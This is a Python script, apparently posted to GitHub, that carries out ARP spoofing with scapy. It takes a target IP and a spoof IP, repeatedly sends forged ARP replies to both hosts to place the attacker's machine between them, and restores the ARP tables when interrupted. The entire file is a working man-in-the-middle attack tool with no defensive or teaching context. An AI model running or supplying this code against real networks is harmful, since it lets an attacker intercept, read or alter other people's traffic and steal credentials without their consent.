#!/usr/bin/python3
# https://github.com/DGclasher

import argparse
import time
import scapy.all as scapy
import sys

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--interface",dest="interface",help="Provide an interface")
    parser.add_argument("-t","--target",dest="target",help="Put the target IP")
    parser.add_argument("-s","--spoof",dest="spoof",help="Put the spoof IP")
    option=parser.parse_args()

    if not option.target:
        parser.error("\nPlease put a target IP\nUse --help for more info")
    elif not option.spoof:
        parser.error("\nPlease put spoof IP\nUse --help for more info")

    return option

def get_mac(ip):                                          
                                                        
    arp_req=scapy.ARP(pdst=ip)                          
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broad=broadcast/arp_req                     

    ans_list=scapy.srp(arp_req_broad, timeout=1, verbose=False)[0]     

    return ans_list[0][1].hwsrc
    
def spoof(target_ip, spoof_ip, interface):
    target_mac=get_mac(target_ip)
    packet=scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=0, iface=interface)

def restore(dest_ip, source_ip, interface):
    dest_mac=get_mac(dest_ip)
    source_mac=get_mac(source_ip)
    packet=scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=0, iface=interface)
    
option=get_args()
if not option.interface:
    print("\n[+] Defaulting interface to eth0 since no interface is provided")
    option.interface="eth0"

count_packet=0

while True:
    try:
        spoof(option.target, option.spoof, option.interface)
        spoof(option.spoof, option.target, option.interface)
        count_packet+=2
        print("\r[+]Packets Sent:"+ str(count_packet),end='')
        sys.stdout.flush()
        time.sleep(1)
    except:
        print("\n\n[+]Restoring to original values\n[-]Quitting Programme")
        restore(option.target, option.spoof, option.interface)
        restore(option.spoof, option.target, option.interface)
        print("\n\tbye!")
        break
